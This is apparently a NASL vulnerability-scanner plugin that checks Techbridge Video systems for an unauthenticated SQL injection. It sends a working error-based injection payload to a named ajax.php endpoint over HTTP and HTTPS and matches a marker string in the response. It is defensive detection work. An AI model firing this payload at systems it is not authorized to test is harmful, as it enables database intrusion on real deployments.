############################################################
# Author: ox50sec@webray.com.cn
# Copyright @WebRAY
############################################################
include("compat.inc");


if(description)
{
 script_id(51799055);
 name = "Techbridge Video - SQL injection";
 script_name(name);
 script_category(ACT_ATTACK);
 script_family(english:"Camera");
 script_set_attribute(attribute:"risk_factor", value:"High");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_set_attribute(attribute:"description", value:"SQL injection vulnerability in techbridge video system, no login required.");
 script_set_attribute(attribute:"solution", value:"1. In the web code, the data entered by users should be strictly filtered. 2. Deploy web application firewall to monitor database operation. 3. Upgrade to the latest version.");
 script_end_attributes();
 script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");


function check_vuln(port){
	if ( !get_port_state(port) ) exit(0);
	url = "/common/web_meeting/ajax.php?module=ajaxUserGetChildGroup&gpId=1 AND (SELECT 8118 FROM(SELECT COUNT(*),CONCAT(0x77656e7363616e74657374,(SELECT (ELT(8118=8118,1))),0x77656e7363616e74657374,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- UYcA";
	req = http_send_recv3(method: "GET", port: port, item: url);
	if( req[2] == NULL) exit(0);
	con = url + req[2];
	if( "wenscantest1wenscantest1" >< req[2] ){
	  	if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
    }
}

function check_vuln_ssl(port){
	if ( !get_port_state(port) ) exit(0);
	url = "/common/web_meeting/ajax.php?module=ajaxUserGetChildGroup&gpId=1 AND (SELECT 8118 FROM(SELECT COUNT(*),CONCAT(0x77656e7363616e74657374,(SELECT (ELT(8118=8118,1))),0x77656e7363616e74657374,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- UYcA";
	res = http_send_recv3(method: "GET", port: port, item: url);
	req = http_last_sent_request();
    ssl_req = https_req_get(port:port , request:req);
	if( ssl_req == NULL) exit(0);
	con = req + ssl_req;
	if( "wenscantest1wenscantest1"><ssl_req ){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}


##################################
kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}